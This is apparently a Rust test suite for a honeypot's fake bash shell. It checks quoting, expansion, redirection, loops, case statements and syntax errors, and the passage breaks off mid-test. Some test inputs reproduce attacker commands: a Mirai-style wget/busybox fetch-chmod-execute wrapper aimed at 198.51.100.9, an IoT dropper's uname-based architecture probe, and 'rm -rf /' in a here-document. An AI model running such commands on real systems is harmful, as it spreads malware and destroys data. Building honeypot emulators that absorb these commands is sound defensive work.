//! The grammar end to end: quoting, the six expansion steps, arithmetic, redirections, pipelines,
//! lists, compound commands, state isolation, continuation lines, unsupported constructs and the
//! caps, all driven through `FakeShell::handle_input` the way a session drives it. Each reply
//! asserted here is what bash 5.1 or dash gives for the same line.

use crate::fakefs::FakeFs;
use crate::shell::{BudgetHit, EmitContext, FakeShell, OutputFd};

fn shell() -> FakeShell {
    FakeShell::new(
        FakeFs::new(),
        EmitContext {
            source_ip: "203.0.113.7".parse().unwrap(),
            wan_ip: None,
            authenticated: true,
            protocol_label: "telnet".to_string(),
            session_id: None,
        },
    )
}

/// The reply to one line, as text.
fn run(sh: &mut FakeShell, line: &str) -> String {
    sh.handle_input(line).0.to_string()
}

/// The reply to a fresh shell's one line.
fn once(line: &str) -> String {
    run(&mut shell(), line)
}

fn status_of(sh: &mut FakeShell, line: &str) -> u8 {
    sh.handle_input(line).0.status
}

mod quoting_and_expansion {
    use super::*;

    #[test]
    fn quotes_group_words_and_are_removed() {
        assert_eq!(once("echo 'a  b'  \"c  d\" e\\ f"), "a  b c  d e f\n");
        assert_eq!(once("echo a\"b\"'c'd"), "abcd\n");
        assert_eq!(once("echo \"it's\" 'say \"hi\"'"), "it's say \"hi\"\n");
        assert_eq!(once("echo ''"), "\n");
        assert_eq!(once("echo \\$HOME \\\\ \\\"x"), "$HOME \\ \"x\n");
    }

    #[test]
    fn a_hash_comments_out_the_rest_only_at_the_start_of_a_word() {
        assert_eq!(once("echo a #b c"), "a\n");
        assert_eq!(once("echo a#b"), "a#b\n");
        assert_eq!(once("echo 'a #b'"), "a #b\n");
        assert_eq!(once("# nothing"), "");
    }

    #[test]
    fn parameters_expand_and_single_quotes_prevent_it() {
        let mut sh = shell();
        assert_eq!(
            run(&mut sh, "x=hello; echo $x ${x} \"$x\" '$x' \"${x}!\""),
            "hello hello hello $x hello!\n"
        );
        assert_eq!(
            run(&mut sh, "echo $HOME $PWD $SHELL $USER"),
            "/root /root /bin/bash root\n"
        );
        assert_eq!(run(&mut sh, "echo $0"), "-bash\n");
        assert_eq!(run(&mut sh, "cd /tmp; echo \"[$PWD]\""), "[/tmp]\n");
    }

    #[test]
    fn defaults_apply_to_unset_and_for_colon_also_to_empty() {
        let mut sh = shell();
        assert_eq!(run(&mut sh, "echo ${nosuch:-d1} ${nosuch-d2}"), "d1 d2\n");
        assert_eq!(run(&mut sh, "e=; echo [${e:-d}] [${e-d}]"), "[d] []\n");
        assert_eq!(run(&mut sh, "x=v; echo ${x:-no} ${x-no}"), "v v\n");
        assert_eq!(run(&mut sh, "echo ${nosuch:-a b}"), "a b\n");
        assert_eq!(run(&mut sh, "echo ${nosuch:-$HOME}"), "/root\n");
    }

    #[test]
    fn special_parameters_report_status_pid_and_arguments() {
        let mut sh = shell();
        run(&mut sh, "false");
        assert_eq!(run(&mut sh, "echo $?"), "1\n");
        run(&mut sh, "nosuchcmd_q");
        assert_eq!(run(&mut sh, "echo $?"), "127\n");
        assert_eq!(
            run(&mut sh, "echo $$"),
            format!("{}\n", crate::persona::session_pid(None))
        );
        assert_eq!(
            run(&mut sh, "set -- a 'b c' d; echo $# $1 $3 [$4]"),
            "3 a d []\n"
        );
        assert_eq!(run(&mut sh, "echo $@ | cat"), "a b c d\n");
        assert_eq!(
            run(&mut sh, "for i in \"$@\"; do echo \"<$i>\"; done"),
            "<a>\n<b c>\n<d>\n"
        );
        assert_eq!(
            run(&mut sh, "for i in $@; do echo \"<$i>\"; done"),
            "<a>\n<b>\n<c>\n<d>\n"
        );
        assert_eq!(run(&mut sh, "echo \"$*\""), "a b c d\n");
        assert_eq!(run(&mut sh, "shift; echo $# $1"), "2 b c\n");
    }

    #[test]
    fn command_substitution_captures_stdout_and_strips_trailing_newlines() {
        let mut sh = shell();
        assert_eq!(run(&mut sh, "echo $(echo a; echo b)"), "a b\n");
        assert_eq!(run(&mut sh, "echo \"$(echo a; echo b)\""), "a\nb\n");
        assert_eq!(run(&mut sh, "echo `echo hi`"), "hi\n");
        assert_eq!(run(&mut sh, "echo $(echo $(echo deep))"), "deep\n");
        assert_eq!(
            run(&mut sh, "x=$(id); echo \"$x\""),
            "uid=0(root) gid=0(root) groups=0(root)\n"
        );
        assert_eq!(run(&mut sh, "echo [$(true)]"), "[]\n");
        // Standard error is not captured; it goes to the terminal ahead of the command.
        assert_eq!(
            run(&mut sh, "echo [$(cat /nonexistent_q)]"),
            "cat: /nonexistent_q: No such file or directory\n[]\n"
        );
        // A substitution runs in a copy of the state.
        assert_eq!(run(&mut sh, "echo $(cd /tmp; pwd); pwd"), "/tmp\n/root\n");
    }

    #[test]
    fn unquoted_results_split_at_ifs_and_quoted_ones_do_not() {
        let mut sh = shell();
        assert_eq!(
            run(&mut sh, "x='a b   c'; for i in $x; do echo \"<$i>\"; done"),
            "<a>\n<b>\n<c>\n"
        );
        assert_eq!(
            run(&mut sh, "for i in \"$x\"; do echo \"<$i>\"; done"),
            "<a b   c>\n"
        );
        assert_eq!(
            run(
                &mut sh,
                "IFS=:; y=p:q::r; for i in $y; do echo \"<$i>\"; done"
            ),
            "<p>\n<q>\n<>\n<r>\n"
        );
    }

    #[test]
    fn an_empty_unquoted_expansion_vanishes_and_a_quoted_one_stays() {
        let mut sh = shell();
        assert_eq!(
            run(&mut sh, "e=; for i in a $e b; do echo \"<$i>\"; done"),
            "<a>\n<b>\n"
        );
        assert_eq!(
            run(&mut sh, "for i in a \"$e\" b; do echo \"<$i>\"; done"),
            "<a>\n<>\n<b>\n"
        );
        assert_eq!(
            run(&mut sh, "for i in $unset_q; do echo x; done; echo done"),
            "done\n"
        );
    }

    #[test]
    fn a_tilde_expands_only_at_the_start_of_an_unquoted_word() {
        let mut sh = shell();
        assert_eq!(
            run(&mut sh, "echo ~ ~/x \"~\" '~' a~ ~root"),
            "/root /root/x ~ ~ a~ ~root\n"
        );
        assert_eq!(run(&mut sh, "P=~/bin:~; echo $P"), "/root/bin:/root\n");
        assert_eq!(run(&mut sh, "cd ~ && pwd"), "/root\n");
    }

    #[test]
    fn globs_match_the_fake_filesystem_and_keep_the_pattern_when_nothing_matches() {
        let mut sh = shell();
        assert_eq!(run(&mut sh, "cd /etc; echo host*"), "hostname hosts\n");
        assert_eq!(run(&mut sh, "echo /etc/h?sts"), "/etc/hosts\n");
        assert_eq!(run(&mut sh, "echo [ho]*s"), "hosts\n");
        assert_eq!(run(&mut sh, "echo nomatch_q*"), "nomatch_q*\n");
        assert_eq!(
            run(&mut sh, "echo \"host*\" 'host*' host\\*"),
            "host* host* host*\n"
        );
        assert_eq!(run(&mut sh, "cd /; echo ??c"), "etc\n");
        assert_eq!(run(&mut sh, "echo /e*/hostn*"), "/etc/hostname\n");
        // Hidden names need an explicit dot.
        run(&mut sh, "cd /tmp; >.hidden; >shown");
        assert_eq!(run(&mut sh, "echo *"), "shown\n");
        assert_eq!(run(&mut sh, "echo .h*"), ".hidden\n");
    }

    #[test]
    fn glob_results_are_capped_at_1024_names() {
        let mut sh = shell();
        run(&mut sh, "cd /tmp");
        // Far more than the cap, created by a loop of touches.
        for i in 0..30 {
            let names: Vec<String> = (0..50).map(|n| format!("f{i}_{n}")).collect();
            run(&mut sh, &format!("cd /tmp; > {}", names.join(" > ")));
        }
        let out = run(&mut sh, "echo f*");
        assert!(
            out.split_whitespace().count() <= 1024,
            "{}",
            out.split_whitespace().count()
        );
    }
}

mod arithmetic {
    use super::*;

    #[test]
    fn expressions_evaluate_with_variables() {
        let mut sh = shell();
        assert_eq!(
            run(
                &mut sh,
                "echo $((1+2*3)) $(( (1+2)*3 )) $((2**10)) $((7%4)) $((1<<4))"
            ),
            "7 9 1024 3 16\n"
        );
        assert_eq!(
            run(
                &mut sh,
                "n=5; echo $((n*2)) $((n>3)) $(($n+1)) $((n ? 10 : 20))"
            ),
            "10 1 6 10\n"
        );
        assert_eq!(run(&mut sh, "echo $((unset_q + 1))"), "1\n");
        assert_eq!(run(&mut sh, "echo $((0x10 + 010))"), "24\n");
    }

    #[test]
    fn arithmetic_wraps_at_64_bits() {
        assert_eq!(
            once("echo $((9223372036854775807 + 1))"),
            "-9223372036854775808\n"
        );
        assert_eq!(
            once("echo $((-9223372036854775807 - 2))"),
            "9223372036854775807\n"
        );
    }

    #[test]
    fn division_by_zero_is_the_shells_error_and_the_command_does_not_run() {
        let mut sh = shell();
        let (out, _) = sh.handle_input("echo before $((1/0)) after");
        assert_eq!(out, "-bash: 1/0: division by 0 (error token is \"0\")\n");
        assert_eq!(out.status, 1);
        assert_eq!(out.output[0].fd, OutputFd::Stderr);
        // The error carries the level's own prefix.
        let mut exec = FakeShell::exec(
            FakeFs::new(),
            EmitContext {
                source_ip: "203.0.113.7".parse().unwrap(),
                wan_ip: None,
                authenticated: true,
                protocol_label: "ssh".to_string(),
                session_id: None,
            },
        );
        assert_eq!(
            run(&mut exec, "echo $((5%0))"),
            "bash: line 1: 5%0: division by 0 (error token is \"0\")\n"
        );
        // The rest of the list still runs.
        assert_eq!(
            run(&mut sh, "echo $((1/0)); echo next"),
            "-bash: 1/0: division by 0 (error token is \"0\")\nnext\n"
        );
        // A branch that is not taken never divides.
        assert_eq!(run(&mut sh, "echo $((0 && 1/0))"), "0\n");
    }

    #[test]
    fn arithmetic_nested_deeper_than_the_cap_fails_without_a_panic() {
        let mut sh = shell();
        let deep = format!("echo $(({}1{}))", "(".repeat(64), ")".repeat(64));
        let (out, _) = sh.handle_input(&deep);
        assert_eq!(out.status, 1);
        assert_eq!(sh.last_trace().budget.hit, Some(BudgetHit::Depth));
    }
}

mod redirection {
    use super::*;

    #[test]
    fn greater_than_creates_truncates_and_appends() {
        let mut sh = shell();
        run(&mut sh, "cd /tmp");
        assert_eq!(
            run(&mut sh, "echo one > f; echo two >> f; cat f"),
            "one\ntwo\n"
        );
        assert_eq!(run(&mut sh, "echo three > f; cat f"), "three\n");
        assert_eq!(run(&mut sh, ">f; cat f"), "");
        // Of two redirections of one descriptor the later wins, but both files are created.
        assert_eq!(run(&mut sh, "echo a >g >f; cat f; cat g"), "a\n");
    }

    #[test]
    fn a_word_attached_operator_redirects_and_a_quoted_one_does_not() {
        let mut sh = shell();
        run(&mut sh, "cd /var");
        assert_eq!(
            run(&mut sh, "cat i>ii"),
            "cat: i: No such file or directory\n"
        );
        assert_eq!(run(&mut sh, "echo x\">y\""), "x>y\n");
        assert_eq!(run(&mut sh, "echo 'a>b'"), "a>b\n");
        assert_eq!(run(&mut sh, "echo a>b; cat b"), "a\n");
    }

    #[test]
    fn input_redirection_feeds_standard_input() {
        let mut sh = shell();
        run(&mut sh, "echo hi > /tmp/f");
        assert_eq!(run(&mut sh, "cat < /tmp/f"), "hi\n");
        let (out, _) = sh.handle_input("cat < /nonexistent_q");
        assert_eq!(out, "-bash: /nonexistent_q: No such file or directory\n");
        assert_eq!(out.status, 1);
        // The command does not run when its input cannot be opened.
        assert_eq!(
            run(&mut sh, "echo ran < /nonexistent_q"),
            "-bash: /nonexistent_q: No such file or directory\n"
        );
    }

    #[test]
    fn descriptors_duplicate_in_order() {
        let mut sh = shell();
        run(&mut sh, "cd /tmp");
        // Standard error to the file along with standard output.
        assert_eq!(
            run(&mut sh, "ls /missing_q > o 2>&1; cat o"),
            "ls: cannot access '/missing_q': No such file or directory\n"
        );
        // `2>&1 >file` sends stderr where stdout USED to point: the terminal.
        assert_eq!(
            run(&mut sh, "ls /missing_q 2>&1 >/dev/null"),
            "ls: cannot access '/missing_q': No such file or directory\n"
        );
        assert_eq!(run(&mut sh, "ls /missing_q >/dev/null 2>&1"), "");
        assert_eq!(run(&mut sh, "ls /missing_q 2>/dev/null"), "");
        assert_eq!(run(&mut sh, "echo hi 1>&2"), "hi\n");
        assert_eq!(
            sh.handle_input("echo hi >&2").0.output[0].fd,
            OutputFd::Stderr
        );
        assert_eq!(
            run(&mut sh, "echo hi >&-"),
            "-bash: echo: write error: Bad file descriptor\n"
        );
        assert_eq!(run(&mut sh, "echo hi >&2 2>/dev/null"), "hi\n");
        assert_eq!(run(&mut sh, "echo hi 3>&1 1>&2 2>&3 >/dev/null"), "");
    }

    #[test]
    fn the_target_is_created_before_the_command_runs_even_when_it_fails() {
        let mut sh = shell();
        run(&mut sh, "cd /tmp");
        assert_eq!(
            run(&mut sh, "cat /missing_q > made"),
            "cat: /missing_q: No such file or directory\n"
        );
        assert_eq!(run(&mut sh, "cat made; echo [$?]"), "[0]\n");
        let (out, _) = sh.handle_input("echo hi > /nope_q/f");
        assert_eq!(out, "-bash: /nope_q/f: No such file or directory\n");
        assert_eq!(out.status, 1);
    }

    #[test]
    fn an_error_names_the_operand_as_typed() {
        let mut sh = shell();
        assert_eq!(
            run(&mut sh, "echo x > nope_q/f"),
            "-bash: nope_q/f: No such file or directory\n"
        );
        assert_eq!(
            run(&mut sh, "cat < nope_q"),
            "-bash: nope_q: No such file or directory\n"
        );
        assert_eq!(
            run(&mut sh, "cd nope_q"),
            "-bash: cd: nope_q: No such file or directory\n"
        );
    }

    #[test]
    fn a_target_that_is_not_one_word_is_an_ambiguous_redirect_in_bash() {
        let mut sh = shell();
        run(&mut sh, "cd /tmp");
        let (out, _) = sh.handle_input("echo hi > $unset_q");
        assert_eq!(out, "-bash: $unset_q: ambiguous redirect\n");
        assert_eq!(out.status, 1);
        assert_eq!(
            run(&mut sh, "x='a b'; echo hi > $x"),
            "-bash: $x: ambiguous redirect\n"
        );
        // Nothing was created: `ls -a` lists only the directory and its parent.
        assert_eq!(run(&mut sh, "ls -a"), ".  ..\n");
        assert_eq!(run(&mut sh, "echo hi > \"$x\"; ls"), "a b\n");
        assert_eq!(run(&mut sh, "echo hi > *.q_none"), "");
        assert_eq!(run(&mut sh, "ls"), "*.q_none  a b\n");
    }

    #[test]
    fn the_ambiguous_redirect_error_and_status_come_from_the_level() {
        let mut sh = shell();
        run(&mut sh, "sh");
        // Dash does not split a redirection target.
        assert_eq!(run(&mut sh, "cd /tmp; x='a b'; echo hi > $x; ls"), "a b\n");
    }

    #[test]
    fn a_redirection_only_command_is_a_real_command() {
        let mut sh = shell();
        assert_eq!(status_of(&mut sh, ">/tmp/x"), 0);
        assert_eq!(status_of(&mut sh, ">/nope_q/x"), 1);
        assert_eq!(
            run(&mut sh, ">/nope_q/x && echo ran"),
            "-bash: /nope_q/x: No such file or directory\n"
        );
    }

    #[test]
    fn here_documents_are_literal_unless_the_delimiter_was_unquoted() {
        let mut sh = shell();
        assert_eq!(run(&mut sh, "x=v"), "");
        assert_eq!(run(&mut sh, "cat <<EOF"), "");
        assert_eq!(sh.prompt(), "> ");
        assert_eq!(run(&mut sh, "a $x $((1+1)) $(echo c) \\$x"), "");
        assert_eq!(run(&mut sh, "EOF"), "a v 2 c $x\n");
        assert_eq!(
            sh.prompt(),
            format!("root@{}:~# ", crate::persona::hostname())
        );

        assert_eq!(run(&mut sh, "cat <<'EOF'\n$x $(id)\nEOF"), "$x $(id)\n");
        assert_eq!(run(&mut sh, "cat <<\"EOF\"\n$x\nEOF"), "$x\n");
        assert_eq!(run(&mut sh, "cat <<\\EOF\n$x\nEOF"), "$x\n");
        assert_eq!(
            run(&mut sh, "cat <<-EOF\n\t\tone\n\ttwo\n\tEOF"),
            "one\ntwo\n"
        );
    }

    #[test]
    fn a_here_document_body_is_never_run_as_commands() {
        let mut sh = shell();
        assert_eq!(
            run(&mut sh, "cat <<EOF\nid\nwhoami; rm -rf /\nEOF"),
            "id\nwhoami; rm -rf /\n"
        );
        // Nothing was removed and no command ran.
        assert!(sh.handle_input("ls /").0.contains("etc"));
    }

    #[test]
    fn a_here_document_feeds_read() {
        let mut sh = shell();
        assert_eq!(
            run(&mut sh, "read a b <<EOF\nx y z\nEOF\necho [$a] [$b]"),
            "[x] [y z]\n"
        );
    }
}

mod pipelines_and_lists {
    use super::*;

    #[test]
    fn a_pipeline_feeds_each_stage_the_one_before_and_reports_the_last() {
        let mut sh = shell();
        assert_eq!(run(&mut sh, "echo a | cat"), "a\n");
        assert_eq!(run(&mut sh, "echo a | cat | cat"), "a\n");
        assert_eq!(
            run(&mut sh, "id | cat"),
            "uid=0(root) gid=0(root) groups=0(root)\n"
        );
        assert_eq!(status_of(&mut sh, "false | true"), 0);
        assert_eq!(status_of(&mut sh, "true | false"), 1);
        assert_eq!(status_of(&mut sh, "true | nosuchcmd_q"), 127);
    }

    #[test]
    fn a_stage_that_is_not_found_reports_and_the_pipeline_goes_on() {
        let mut sh = shell();
        assert_eq!(
            run(&mut sh, "nosuchcmd_q | cat"),
            "nosuchcmd_q: command not found\n"
        );
        assert_eq!(
            run(&mut sh, "echo a | nosuchcmd_q"),
            "nosuchcmd_q: command not found\n"
        );
    }

    #[test]
    fn a_bang_negates_the_status() {
        let mut sh = shell();
        assert_eq!(status_of(&mut sh, "! false"), 0);
        assert_eq!(status_of(&mut sh, "! true"), 1);
        assert_eq!(run(&mut sh, "! false; echo $?"), "0\n");
        assert_eq!(run(&mut sh, "! echo a | false; echo $?"), "0\n");
    }

    #[test]
    fn and_or_lists_decide_on_status_not_on_output_words() {
        let mut sh = shell();
        assert_eq!(
            run(&mut sh, "echo not found && echo continued"),
            "not found\ncontinued\n"
        );
        assert_eq!(run(&mut sh, "false && echo no || echo yes"), "yes\n");
        assert_eq!(run(&mut sh, "true || echo no && echo yes"), "yes\n");
        assert_eq!(run(&mut sh, "true && false || echo rescued"), "rescued\n");
        assert_eq!(run(&mut sh, "false || false || echo third"), "third\n");
        assert_eq!(run(&mut sh, "true && true && echo all"), "all\n");
        assert_eq!(status_of(&mut sh, "false && true"), 1);
        assert_eq!(status_of(&mut sh, "true || false"), 0);
    }

    #[test]
    fn a_newline_inside_the_input_separates_commands() {
        let mut sh = shell();
        assert_eq!(run(&mut sh, "echo a\necho b"), "a\nb\n");
        assert_eq!(run(&mut sh, "false &&\necho no ||\necho yes"), "yes\n");
    }

    #[test]
    fn a_background_command_runs_now_in_a_copy_and_reports_its_job() {
        let mut sh = shell();
        let out = run(&mut sh, "cd /etc & pwd");
        let pid = crate::persona::session_pid(None).saturating_add(1);
        assert_eq!(out, format!("[1] {pid}\n/root\n"));
        assert_eq!(run(&mut sh, "echo $!"), format!("{pid}\n"));
        assert_eq!(status_of(&mut sh, "false &"), 0);
        // A second job takes the next number and pid.
        assert_eq!(run(&mut sh, "true &"), format!("[3] {}\n", pid + 2));
        // Not interactive: no job line.
        assert_eq!(run(&mut sh, "sh -c 'echo x &'"), "x\n");
        assert_eq!(run(&mut sh, "echo $(echo y &)"), "y\n");
    }
}

mod compound_commands {
    use super::*;

    #[test]
    fn a_subshell_isolates_the_working_directory_variables_and_exit() {
        let mut sh = shell();
        assert_eq!(run(&mut sh, "(cd /tmp; pwd); pwd"), "/tmp\n/root\n");
        assert_eq!(run(&mut sh, "(x=1); echo \"[$x]\""), "[]\n");
        assert_eq!(run(&mut sh, "(exit 3); echo $?"), "3\n");
        assert_eq!(run(&mut sh, "(exit 3) || echo failed"), "failed\n");
        assert_eq!(run(&mut sh, "(echo a; echo b) | cat"), "a\nb\n");
        assert_eq!(run(&mut sh, "(false; true); echo $?"), "0\n");
        assert_eq!(run(&mut sh, "(true; false); echo $?"), "1\n");
        // The filesystem is shared.
        assert_eq!(
            run(&mut sh, "(echo hi > /tmp/shared); cat /tmp/shared"),
            "hi\n"
        );
    }

    #[test]
    fn a_pipeline_stage_is_a_subshell_too() {
        let mut sh = shell();
        assert_eq!(run(&mut sh, "cd /tmp | cat; pwd"), "/root\n");
        assert_eq!(run(&mut sh, "echo x | read v; echo \"[$v]\""), "[]\n");
    }

    #[test]
    fn a_brace_group_runs_in_the_current_shell() {
        let mut sh = shell();
        assert_eq!(run(&mut sh, "{ cd /tmp; x=1; }; pwd; echo $x"), "/tmp\n1\n");
        assert_eq!(
            run(&mut sh, "{ echo a; echo b; } > /tmp/g; cat /tmp/g"),
            "a\nb\n"
        );
        assert_eq!(
            run(&mut sh, "{ echo a; ls /missing_q; } 2>/dev/null"),
            "a\n"
        );
    }

    #[test]
    fn redirections_apply_to_a_whole_compound_command() {
        let mut sh = shell();
        assert_eq!(
            run(&mut sh, "(echo a; echo b) > /tmp/h; cat /tmp/h"),
            "a\nb\n"
        );
        assert_eq!(
            run(
                &mut sh,
                "for i in 1 2; do echo $i; done > /tmp/l; cat /tmp/l"
            ),
            "1\n2\n"
        );
        assert_eq!(
            run(&mut sh, "if true; then echo t; fi >> /tmp/l; cat /tmp/l"),
            "1\n2\nt\n"
        );
        // The Mirai fetch wrapper: a fallback group whose output goes to a file.
        assert_eq!(
            run(
                &mut sh,
                "(wget -qO- http://198.51.100.9/w || busybox wget -qO- http://198.51.100.9/w) > /tmp/w; chmod 777 /tmp/w; /tmp/w; echo done"
            ),
            "done\n"
        );
    }

    #[test]
    fn if_elif_else_pick_the_first_branch_whose_condition_succeeds() {
        let mut sh = shell();
        assert_eq!(run(&mut sh, "if true; then echo a; else echo b; fi"), "a\n");
        assert_eq!(
            run(&mut sh, "if false; then echo a; else echo b; fi"),
            "b\n"
        );
        assert_eq!(
            run(
                &mut sh,
                "if false; then echo a; elif true; then echo c; else echo b; fi"
            ),
            "c\n"
        );
        assert_eq!(run(&mut sh, "if false; then echo a; fi; echo $?"), "0\n");
        assert_eq!(
            run(&mut sh, "if echo cond; then echo body; fi"),
            "cond\nbody\n"
        );
        assert_eq!(run(&mut sh, "if ! false; then echo neg; fi"), "neg\n");
        assert_eq!(status_of(&mut sh, "if true; then false; fi"), 1);
    }

    #[test]
    fn for_iterates_over_words_and_expansions() {
        let mut sh = shell();
        assert_eq!(
            run(&mut sh, "for i in 1 2 3; do echo $i; done"),
            "1\n2\n3\n"
        );
        assert_eq!(
            run(&mut sh, "for i in $(echo x y); do echo $i; done"),
            "x\ny\n"
        );
        assert_eq!(
            run(&mut sh, "cd /etc; for f in host*; do echo [$f]; done"),
            "[hostname]\n[hosts]\n"
        );
        assert_eq!(run(&mut sh, "for i in; do echo x; done; echo $?"), "0\n");
        assert_eq!(run(&mut sh, "for i in a b; do :; done; echo $i"), "b\n");
        assert_eq!(
            run(
                &mut sh,
                "for d in /var/run /mnt /dev/shm /tmp; do >$d/.x && cd $d && break; done; pwd"
            ),
            "/var/run\n"
        );
    }

    #[test]
    fn while_and_until_loop_on_the_condition_status() {
        let mut sh = shell();
        run(&mut sh, "echo -e 'a\\nb\\nc' > /tmp/lines");
        assert_eq!(
            run(&mut sh, "while read x; do echo got $x; done < /tmp/lines"),
            "got a\ngot b\ngot c\n"
        );
        assert_eq!(
            run(
                &mut sh,
                "until read x; do echo never; done < /tmp/lines; echo $?"
            ),
            "0\n"
        );
        assert_eq!(
            run(
                &mut sh,
                "n=0; until false; do n=$((n+1)); if echo $n | cat > /dev/null; then break; fi; done; echo $n"
            ),
            "1\n"
        );
        assert_eq!(
            run(&mut sh, "while false; do echo never; done; echo $?"),
            "0\n"
        );
    }

    #[test]
    fn break_and_continue_leave_or_skip_the_right_loop() {
        let mut sh = shell();
        assert_eq!(
            run(&mut sh, "for i in 1 2 3; do echo $i; break; done"),
            "1\n"
        );
        assert_eq!(
            run(
                &mut sh,
                "for i in 1 2 3; do if true; then continue; fi; echo $i; done; echo end"
            ),
            "end\n"
        );
        assert_eq!(
            run(
                &mut sh,
                "for i in a b; do for j in 1 2; do echo $i$j; break 2; done; done; echo end"
            ),
            "a1\nend\n"
        );
        assert_eq!(
            run(
                &mut sh,
                "for i in a b; do for j in 1 2; do echo $i$j; continue 2; done; echo never; done"
            ),
            "a1\nb1\n"
        );
        // Bash complains outside a loop; the status is still 0.
        let (out, _) = sh.handle_input("break");
        assert_eq!(
            out,
            "-bash: break: only meaningful in a `for', `while', or `until' loop\n"
        );
        assert_eq!(out.status, 0);
    }

    #[test]
    fn exit_ends_only_the_subshell_or_script_that_ran_it() {
        let mut sh = shell();
        assert_eq!(
            run(&mut sh, "sh -c 'echo a; exit 4; echo b'; echo $?"),
            "a\n4\n"
        );
        assert_eq!(
            run(&mut sh, "(echo a; exit; echo b); echo after"),
            "a\nafter\n"
        );
        // An assignment alone takes the status of the substitution it holds.
        assert_eq!(run(&mut sh, "x=$(exit 5); echo $?"), "5\n");
        assert_eq!(run(&mut sh, "x=$(true); echo $?"), "0\n");
    }
}

mod case_commands {
    use super::*;

    #[test]
    fn the_first_matching_arm_runs_and_only_it() {
        assert_eq!(
            once("case b in a) echo A;; b) echo B;; b) echo again;; esac"),
            "B\n"
        );
        assert_eq!(
            once("case zzz in a) echo A;; *) echo other;; esac"),
            "other\n"
        );
        assert_eq!(once("case zzz in a) echo A;; esac"), "");
    }

    #[test]
    fn patterns_alternate_glob_and_honour_quotes() {
        assert_eq!(once("case i386 in i686|i386) echo x86;; esac"), "x86\n");
        assert_eq!(once("case aarch64 in a*64) echo wide;; esac"), "wide\n");
        assert_eq!(once("case a/b in a?b) echo slash;; esac"), "slash\n");
        assert_eq!(once("case x in [a-z]) echo class;; esac"), "class\n");
        // A quoted star is a plain character.
        assert_eq!(
            once("case abc in '*') echo no;; *) echo yes;; esac"),
            "yes\n"
        );
        assert_eq!(once("case '*' in '*') echo literal;; esac"), "literal\n");
        // A pattern held in a variable globs when unquoted, not when quoted.
        assert_eq!(once("p='a*'; case abc in $p) echo glob;; esac"), "glob\n");
        assert_eq!(
            once("p='a*'; case abc in \"$p\") echo glob;; *) echo no;; esac"),
            "no\n"
        );
    }

    #[test]
    fn the_subject_expands_without_splitting() {
        assert_eq!(
            once("v='a b'; case $v in 'a b') echo whole;; esac"),
            "whole\n"
        );
        assert_eq!(once("case $(echo hi) in hi) echo sub;; esac"), "sub\n");
    }

    #[test]
    fn an_arm_can_assign_and_the_status_is_the_arms() {
        let mut sh = shell();
        assert_eq!(
            run(&mut sh, "case x in x) U=chosen;; esac; echo $U"),
            "chosen\n"
        );
        assert_eq!(status_of(&mut sh, "case x in x) false;; esac"), 1);
        assert_eq!(status_of(&mut sh, "case x in y) false;; esac"), 0);
        assert_eq!(status_of(&mut sh, "case x in x) ;; esac"), 0);
    }

    #[test]
    fn a_case_spans_lines_and_nests() {
        let mut sh = shell();
        assert_eq!(run(&mut sh, "case x in"), "");
        assert_eq!(run(&mut sh, "  x)"), "");
        assert_eq!(run(&mut sh, "    case y in y) echo inner;; esac"), "");
        assert_eq!(run(&mut sh, "    ;;"), "");
        assert_eq!(run(&mut sh, "esac"), "inner\n");
    }

    #[test]
    fn a_case_redirects_and_pipes_like_any_compound() {
        let mut sh = shell();
        assert_eq!(
            run(&mut sh, "case x in x) echo hi;; esac > /tmp/c; cat /tmp/c"),
            "hi\n"
        );
        assert_eq!(run(&mut sh, "case x in x) echo hi;; esac | cat"), "hi\n");
    }

    /// The architecture probe an IoT dropper runs before it picks a binary: `uname -m` in a
    /// substitution, a `case` mapping it to a name, and a variable in the URL.
    #[test]
    fn an_architecture_probe_picks_the_arm_for_the_persona() {
        let mut sh = shell();
        assert_eq!(
            run(
                &mut sh,
                "A=$(uname -m);case $A in x86_64)U=amd;;i686|i386)U=x86;;aarch64|arm64)U=arm64;;*)U=other;;esac; echo $A $U"
            ),
            "x86_64 amd\n"
        );
    }
}

mod unsupported_constructs {
    use super::*;

    /// Each of these parses, is skipped with status 0, and prints nothing at all: no output a
    /// real shell would not give and no syntax error bash would not raise.
    #[test]
    fn every_unsupported_construct_degrades_to_a_silent_success() {
        for line in [
            "case ${x##*/} in x) echo hi;; esac",
            "[[ -f /etc/hostname && -d /tmp ]]",
            "f() { echo hi; }",
            "function g { echo hi; }",
            "echo $'a\\nb'",
            "((i = 1 + 2))",
            "for ((i=0; i<3; i++)); do echo $i; done",
            "echo ${x##*/} ${x%.*} ${x/a/b} ${#x} ${x:1:2} ${x:=y}",
            "echo {a,b,c}",
            "echo {1..3}",
            "cat <<< here",
            "a=(1 2 3)",
            "cat <(echo hi)",
            "coproc cat",
        ] {
            let mut sh = shell();
            let (out, events) = sh.handle_input(line);
            assert_eq!(out, "", "{line}");
            assert_eq!(out.status, 0, "{line}");
            assert_eq!(events.len(), 1, "{line}: still one command event");
        }
    }

    #[test]
    fn an_unsupported_command_in_a_list_does_not_stop_the_rest() {
        let mut sh = shell();
        assert_eq!(
            run(&mut sh, "case ${x##*/} in x) echo no;; esac; echo after"),
            "after\n"
        );
        assert_eq!(run(&mut sh, "echo a && [[ x ]] && echo b"), "a\nb\n");
        assert_eq!(run(&mut sh, "false || echo $'x' || echo y"), "");
    }

    #[test]
    fn the_supported_neighbours_of_unsupported_syntax_still_work() {
        let mut sh = shell();
        assert_eq!(
            run(&mut sh, "echo ${HOME} ${nosuch:-d} {} {a} a{b"),
            "/root d {} {a} a{b\n"
        );
    }
}

mod syntax_errors {
    use super::*;

    #[test]
    fn what_bash_rejects_prints_the_login_shells_error_and_status_2() {
        for (line, token) in [
            (")", ")"),
            (";", ";"),
            ("&& echo a", "&&"),
            ("| cat", "|"),
            ("echo a )", ")"),
            ("fi", "fi"),
            ("done", "done"),
            ("then", "then"),
            ("}", "}"),
            (";;", ";;"),
            ("if true; then fi", "fi"),
        ] {
            let mut sh = shell();
            let (out, _) = sh.handle_input(line);
            assert_eq!(
                out,
                format!("-bash: syntax error near unexpected token `{token}'\n"),
                "{line}"
            );
            assert_eq!(out.status, 2, "{line}");
            assert_eq!(out.output[0].fd, OutputFd::Stderr, "{line}");
            assert_eq!(run(&mut sh, "echo $?"), "2\n", "{line}");
        }
        assert_eq!(
            once("echo >"),
            "-bash: syntax error near unexpected token `newline'\n"
        );
    }

    #[test]
    fn nothing_on_a_line_runs_when_the_line_has_a_syntax_error() {
        let mut sh = shell();
        assert_eq!(
            run(&mut sh, "echo a; )"),
            "-bash: syntax error near unexpected token `)'\n"
        );
        assert_eq!(
            run(&mut sh, "echo a; echo b )"),
